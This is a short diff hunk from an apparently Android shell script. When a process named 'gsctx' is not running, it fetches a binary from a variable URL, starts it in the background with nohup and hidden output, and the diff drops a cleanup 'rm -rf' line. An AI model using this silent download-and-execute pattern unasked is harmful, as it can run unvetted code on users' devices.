@@ -40,7 +40,6 @@ status=$(pgrep -f gsctx) >/dev/null 2>&1
 if [ ! "$status" ]; then
 	storm -rP "$BIN" -s "${URL}" -fn "gsctx" "$@"
 	nohup /data/local/tmp/goodsettings/gsctx >/dev/null 2>&1 &
-	rm -rf $BIN
 fi
 
 sleep 2
